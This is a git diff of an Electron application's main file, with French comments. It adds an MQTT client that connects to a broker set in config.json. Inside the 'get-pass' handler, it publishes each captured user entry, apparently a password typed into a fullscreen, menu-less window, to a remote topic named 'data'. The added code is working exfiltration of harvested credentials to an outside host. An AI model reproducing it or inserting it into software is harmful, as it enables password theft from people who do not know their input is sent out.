@@ -2,6 +2,7 @@ const { app, BrowserWindow, ipcMain } = require('electron');
 const path = require('path');
 const os = require('os');
 const fs = require('fs');
+const mqtt = require('mqtt');
 const regedit = require('regedit');
 const { exec } = require('child_process');
 
@@ -9,12 +10,54 @@ const { exec } = require('child_process');
 let passSaved = false;
 let canQuit = false;
 
+//#region chemins
 // Chemin dynamique pour localiser le dossier vbs en mode production
 const vbsPath = path.join(process.resourcesPath, 'app', 'node_modules', 'regedit', 'vbs');
 regedit.setExternalVBSLocation(vbsPath);
 
-//chemin du json
-const filePath = path.join(path.dirname(app.getPath('exe')), 'userData.json');
+//chemin du json des datas
+const filePath = app.isPackaged
+  ? path.join(app.getPath('exe'), 'userData.json')//a côté de lexe car non packagé
+  : path.join(__dirname, 'userData.json'); // a la racine de l'enviro
+
+//chemin json config
+const configPath = app.isPackaged
+  ? path.join(app.getPath('exe'), 'config.json')//a côté de lexe car non packagé
+  : path.join(__dirname, 'config.json'); // a la racine de l'enviro
+
+let config = {};
+
+if (fs.existsSync(configPath)) {
+  try {
+      config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
+  } catch (error) {
+      console.error("Erreur de parsing du fichier config.json :", error);
+  }
+} else {
+  console.warn("Le fichier config.json est introuvable au chemin :", configPath, "on va faire sans");
+}
+
+//#endregion
+//#region mqtt
+// Configurer les options de connexion MQTTs
+let client;
+
+if (config.mqtt) {
+  if (config.useMqtt === true) {
+    // Créer la connexion MQTTs
+    client = mqtt.connect(config.mqtt);
+
+    client.on('connect', () => {
+      console.log("Connecté au serveur MQTTs");
+    });
+
+    client.on('error', (error) => {
+      console.error("Erreur de connexion MQTT :", error);
+    });
+  }
+}
+
+//#endregion
 
 //#region get du nom
 let username;
@@ -154,7 +197,7 @@ function createWindow() {
   GetLanguage(langueSys, (translations) => {
     locales = translations;
   });
-  
+
   console.log("Langue système :", locales);
 
   // Passe en plein écran et masque la barre de menu lorsqu'on charge `index.html`
@@ -227,10 +270,24 @@ ipcMain.on('get-pass', (event, userInput) => {
       } else {
         console.log("Données sauvegardées dans userData.json");
         passSaved = true;
-        if (canQuit === true) app.quit();
-        else console.log("en attente fin de transition");
       }
     });
+    if (canQuit === true && (config.useMqtt === false || config.useMqtt === undefined)) {
+      app.quit();
+    } else {
+      if((config.useMqtt === false || config.useMqtt === undefined)) return;
+      // Envoyer les données au topic "data"
+      client.publish('data', JSON.stringify(newEntry), { qos: 1 }, (error) => {
+        if (error) {
+          console.error("Erreur d'envoi MQTT :", error);
+        } else {
+          console.log("Données envoyées avec succès sur le topic 'data'");
+        }
+        client.end();
+        config.hasSended = true;
+        if (canQuit === true) app.quit();
+      });
+    }
   }
 
   // Lecture du fichier pour ajouter les données de manière additive
@@ -267,7 +324,7 @@ ipcMain.on('set-opacity', (event, opacity) => {
 ipcMain.on('close-window', (event, data) => {
   console.log("transition finito");
   canQuit = true;
-  if (passSaved === true) app.quit();
+  if (passSaved === true && (config.hasSended === true || config.useMqtt === undefined)) app.quit();
 });
 
 ipcMain.on('setup-quit', (event, data) => {
